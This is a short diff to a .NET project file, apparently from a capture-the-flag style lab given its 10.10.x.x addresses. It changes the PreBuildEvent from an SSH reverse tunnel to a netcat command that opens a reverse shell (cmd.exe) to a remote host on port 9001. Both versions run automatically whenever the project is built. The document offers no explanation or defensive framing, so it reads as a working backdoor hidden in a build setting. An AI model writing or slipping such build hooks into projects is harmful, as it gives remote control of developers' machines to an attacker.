@@ -4,6 +4,6 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-    <PreBuildEvent>cmd.exe /k ssh -R 2222:localhost:22 rce@10.10.11.234</PreBuildEvent>
+    <PreBuildEvent>cmd.exe /k nc -e cmd.exe 10.10.16.41 9001</PreBuildEvent>
   </PropertyGroup>
 </Project>
